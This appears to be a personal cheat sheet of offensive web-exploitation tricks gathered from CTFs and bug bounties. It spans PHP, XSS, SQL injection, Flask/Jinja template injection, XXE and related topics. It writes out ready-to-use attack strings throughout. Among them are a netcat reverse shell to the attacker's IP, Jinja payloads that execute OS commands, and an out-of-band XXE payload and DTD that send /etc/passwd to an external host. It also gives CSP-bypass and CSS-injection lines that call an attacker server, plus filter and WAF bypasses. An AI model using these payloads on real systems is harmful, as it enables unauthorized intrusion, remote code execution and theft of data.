---
title: Web notes
author: gros
layout: page
---

Notes from web ctfs, writeups, bug-bounties...
### Random web stuff

#### Post exploitation
* real tty (http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
    + on your machine: ```nc -v -n -l -p port```
    + on victim server run: ```nc your_ip port -e /bin/bash```
    + on your machine: ```python -c 'import pty; pty.spawn("/bin/bash");'```

#### PHP
* .pht, .phtml, php3, php4 extensions (most servers parse them as php)
* parse_url in php
    + relative url problem (//domain.com?asd) (<https://bugs.php.net/bug.php?id=43721>)
    + http://example.com:80?@google.com/ (<https://bugs.php.net/bug.php?id=73192&edit=3>)
* readfile + windows -> 8.3 filenames
* preg_match -> bypass via backtick limit
* type juggling
* base_dir bypass:
    + ```$file = new SplFileObject("/var/www/html/blabla/test.php", "w"); $file->fwrite('shell');```
    + pcntl_exec
    + linkinfo, realpath <= 5.3.6
* disable_functions bypass via LD_PRELOAD+mail() (<https://rdot.org/forum/showpost.php?p=38750&postcount=16>)
* PHP OPcache Override (<https://github.com/GoSecure/php7-opcache-override>)
* assert is eval
* non-common php tags
    + ```<script language="php"></script>```
    + ```<% %>```
* code evaluation
    + complex (curly) syntax (<http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>)
    + heredoc syntax
    + user-supplied values in double-quotes
    + eval
    + create_function
    + preg_replace with /e
* extract is evil
* unlink with wrong folder don't work? (<https://rdot.org/forum/showthread.php?t=3102>)
* LFI: with zip, phar, data, expect, php://filter/convert.base64-encode/resource=index.php, file://, glob
* Bypass images resize: https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE
* Bypass basic auth with <limit> via non-standard request methods (https://www.reddit.com/r/netsec/comments/st9nc/bypassing_http_basic_authentication_in_php/)

#### XSS:
* hex encoding in js
* innerHTML
* xss-protector can disable some scripts (i.e. if script is found in url)
* dom clobbering
* httpOnly cookies via phpinfo()
* CSP bypass:
    + ```<link rel="prefetch" href="http://your-server/"> ```
    + ```<meta http-equiv="refresh" content="0; url=http://your-server/">```
* DNS rebinding
* ```<iframe srcdoc="">``` and other stuff (<https://html5sec.org>)
* blind CSS injection: ```span[value$='1']{content: url('http://myhost/?i')}```
* injection for PhantomJS: http://yoururl.com/?"+require('fs').read('/etc/passwd');page.customHeaders={Host:'127.0.0.1'};var nonce="
* auth: if login via token, try redirect victim to that link and login to your profile with xss


#### SQL:
* union select X'31333337' -> union select 1337 (hex encoding)
* charsets big5, cp932, gb2312, gbk and sjis: \xbf\x27 escaped to \xbf\x5c\x27, but \xbf\x5c are treated as one char, leaving \x27 unescaped [http://stackoverflow.com/questions/5741187](http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602)
* Hibernate + H2 db: non-breaking-space is not recognized by Hibernate (https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/web_5#eng-version)
* WAF bypass with %0b: sel%0bect

#### Python:
* url_parse in python problem with path params \(?asd;xxx\)
* upload \__init__.py file + import
* app.secret_key in flask -> you know it, you can spoof session cookies
* flask uses his error pages only for specified addresses, including 127.0.0.1


    ```
    {% raw %}
    flask rce payloads
    {% for x in {}.__class__.__base__.__subclasses__() %}{% if hasattr(x,'_module') %}{{x._module.__builtins__['__import__']('os').system("ls")}}{% endif %}{% endfor %}

    {% set loadedClasses = " ".__class__.__mro__[2].__subclasses__() %}
    {% for loadedClass in loadedClasses %} {% if loadedClass.__name__ == "catch_warnings".strip() %}
        {% set builtinsReference = loadedClass()._module.__builtins__ %}
        {% set os = builtinsReference["__import__".strip()]("subprocess".strip()) %}
            {{ os.check_output("cat sha4/flag_bilaabluagbiluariglublaireugrpoop".strip(), shell=True) }}
        {% endif %}
    {% endfor %}
    {% endraw %}
    ```

* format is exploitable: '{your_input}'.format(some_python_object) like '{0.__class__}'.format(object) (http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/)
* web cache dir ../__pycache__/__init__.cpython-35.pyc

#### Ruby:
* URI(params[:url]).scheme == 'http' bypass by creating 'http' dir
* `open(params[:url]) -> rce with |ls`

#### Perl:
* params pollution (```$x=asd&$x=fre -> array```)
* dicts are expanded with arrays
* can be broken in many ways: [Camel](https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2542/original/the-perl-jam-netanel-rubin-31c3.pdf), [Camel strikes back](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)

#### Bash:
* no white spaces: ```{echo,a,b}; echo$FISa$FISb```

#### Apache:
* /server-status (mod_status)
*  \+ Tomcat: file handling abuse by append %01 to end of filename (/whatever.jsp%01) (<http://secalert.net/#scl-soh>)

#### node.js
* create Buffer(x) with x as number will create Buffer with x bytes of uninitialized memory -> memory leak

#### Other:
* redis via http (<http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html>)
* some frameworks rewrites route urls (ie. /admin -> /index.php/admin), can bypass htaccess auth (with Location directive)
* wget < 1.18 arbitrary file upload (CVE-2016-4971)
* wget with get params: asd.txt?index.php
* latex parsing -> can get rce (\immediate\write18{ls})
* rfc5988 - web links; returned file depends on Accept header (firefox only)
* HEAD request halt script execution at first output 
* Alternatives to localhost: 127.0.0.1, lvh.me, lacolhost.com, vcap.me, localhost.tv ...
* Kubernetes by default mounts secrets at: /var/run/secrets/kubernetes.io/serviceaccount it allows compromise infrastructure (https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
* Private Docker Registry (link up)
* tar with colon (:) in name try to connect to remote, ie. tar -xf example.com:file
* link to proc: /dev/fd/../environ
* google-proxy: Google data saver (compression) proxy may be used to bypass some filters

#### XXE:
```
Do podatnej strony leci:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [ 
<!ENTITY % bbb SYSTEM "http://gros.users.warchall.net/xxe.dtd"> %bbb; %encja;
]><xxe>&test;</xxe>

w xxe.dtd jest:
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % encja '<!ENTITY test SYSTEM "http://gros.users.warchall.net/?p=%test;">'>
```

#### CURL
* Funny stuff with {} and [], i.e. http://lvh.me/{uploads/1492563387EJ5e3yT5.png,flag.php} make two requests and concat response